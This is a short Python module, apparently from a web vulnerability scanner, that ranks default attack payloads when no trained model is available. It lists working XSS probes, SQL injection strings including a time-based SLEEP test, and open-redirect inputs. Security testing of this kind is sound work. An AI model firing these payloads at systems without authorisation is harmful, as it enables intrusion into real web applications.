from __future__ import annotations
from typing import Any, Dict, List
from backend.app_state import MODEL_DIR, REQUIRE_RANKER

# Minimal: return Top-K static payloads if models are missing
DEFAULTS = {
    "xss": ['"><svg onload=alert(1)>', "<img src=x onerror=alert(1)>", "'\"><script>alert(1)</script>"],
    "sqli": ["'", "' OR '1'='1' -- ", "1 AND SLEEP(2) -- "],
    "redirect": ["https://example.com/", "//example.com/", "/\\example.com"],
}

def rank_payloads(family: str, endpoint_meta: Dict[str,Any], candidates=None, top_k:int=3) -> List[Dict[str,Any]]:
    fam = family.lower()
    pool = DEFAULTS.get(fam, [])
    if REQUIRE_RANKER and not pool:
        raise RuntimeError("Ranker required but no model present")
    return [{"payload": p, "p_cal": 0.7 - i*0.1, "score": 1.0 - i*0.1} for i,p in enumerate(pool[:top_k])]